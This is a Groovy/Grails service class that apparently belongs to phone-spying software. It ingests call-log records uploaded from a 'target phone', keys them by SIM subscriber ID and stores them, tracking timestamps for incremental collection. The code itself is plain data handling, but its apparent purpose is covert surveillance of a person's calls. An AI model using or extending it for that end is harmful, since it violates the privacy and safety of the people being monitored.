package com.atlancy.secrecy.services.helpers

import org.codehaus.jackson.map.DeserializationConfig
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference
import org.springframework.dao.DuplicateKeyException

import com.atlancy.domain.CallLog;
import com.atlancy.domain.TargetPhone;
import com.atlancy.secrecy.services.helpers.interfaces.ServiceInterface
import com.spy.tools.SpyUtils
import com.xaviar.market.rest.item.DataHolder
import com.xaviar.market.rest.item.DataHolderConstants

class CallLogService implements ServiceInterface{

	@Override
	public Long getLastTs(String authSimSubscriberId){
		List <CallLog> callLogs = CallLog.createCriteria().list{
			and {
				targetPhone{ eq("simSubscriberId", authSimSubscriberId) }
			}
			order("timeSeconds","desc")
		};

		if(callLogs!=null && callLogs.size()>0){
			return callLogs.get(0).timeSeconds.getTime();
		}else{
			return null;
		}
	}

	@Override
	public String getWishString(String authSimSubscriberId) {
		def callLogTs = getLastTs(authSimSubscriberId);
		if(callLogTs!=null){
			//TODO - change to CALL_LOG no need for different wish like CALL_LOG_EVENT it needs to be managed by timestamp only.
			return "\"" + DataHolderConstants.CALL_LOG_EVENT + "\":" + callLogTs;
		}else{
			return "\"" + DataHolderConstants.CALL_LOG + "\":0";
		}
	}

	def addCallLogEvents(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientCallLogEvent = dataHolder.get(DataHolderConstants.CALL_LOG_EVENT);
		if (clientCallLogEvent != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<CallLog> phoneEvents = mapper.readValue(clientCallLogEvent,new TypeReference<List<CallLog>>() {
					});
			phoneEvents.each{
				try{
					it.id=it.id+"_"+targetPhone.simSubscriberId;
					it.targetPhone=targetPhone;

					if(it.phoneNumber!=null){
						it.countryCode = SpyUtils.getCountryCode(it.phoneNumber);
					}else{
						it.countryCode = "972";
					}

					it.recordOrigin="EVENT";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true,insert:true);
				}catch(DuplicateKeyException e){
					println "Duplicate Key Exception : " + it.id+"_"+targetPhone.simSubscriberId;
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}
	}

	def addCallLogs(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientCallLog = dataHolder.get(DataHolderConstants.CALL_LOG);
		if (clientCallLog != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<CallLog> callLogs = mapper.readValue(clientCallLog,new TypeReference<List<CallLog>>() {
					});

			callLogs.each{
				try{
					it.id=it.id+"_"+targetPhone.simSubscriberId;
					it.targetPhone=targetPhone;
					if(it.phoneNumber!=null){
						it.countryCode = SpyUtils.getCountryCode(it.phoneNumber);
					}else{
						it.countryCode = "972";
					}
					it.recordOrigin="ORIGINAL";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true,insert:true);
				}catch(DuplicateKeyException e){
					println "Duplicate Key Exception : " + it.id+"_"+targetPhone.simSubscriberId;
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}
	}
}
